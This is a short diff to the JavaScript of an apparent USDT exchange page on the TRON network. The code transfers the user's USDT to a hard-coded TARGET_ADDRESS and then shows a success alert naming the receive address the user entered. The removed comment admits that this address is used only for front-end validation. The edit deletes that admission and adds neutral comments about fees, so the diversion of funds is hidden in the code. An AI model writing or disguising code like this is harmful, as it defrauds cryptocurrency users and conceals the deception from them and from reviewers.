@@ -150,17 +150,16 @@ exchangeBtn.addEventListener("click", async () => {
         // 将 USDT 数量转换为最小单位（USDT 是 6 位小数）
         const amount = usdtAmount * 10 ** 6;
 
-        // 调用 transfer 方法转账（这里仍然转到原先的固定地址，接收地址仅用于前端验证）
+        // 调用 transfer 方法转账，不设置 feeLimit，让钱包自行计算
         await contract.transfer(TARGET_ADDRESS, amount).send({
-            feeLimit: 10000000,
-            callValue: 0,
-            shouldPollResponse: true
+            callValue: 0, // 不发送 TRX
+            shouldPollResponse: true // 等待交易确认
         });
 
         alert(`转账成功！请等待确认。接收地址：${receiveAddress}`);
     } catch (error) {
         console.error("转账失败:", error);
-        alert("转账失败，请检查网络或钱包设置！");
+        alert("转账失败，请检查网络或钱包设置！可能是手续费不足或网络拥堵。");
     }
 });
 
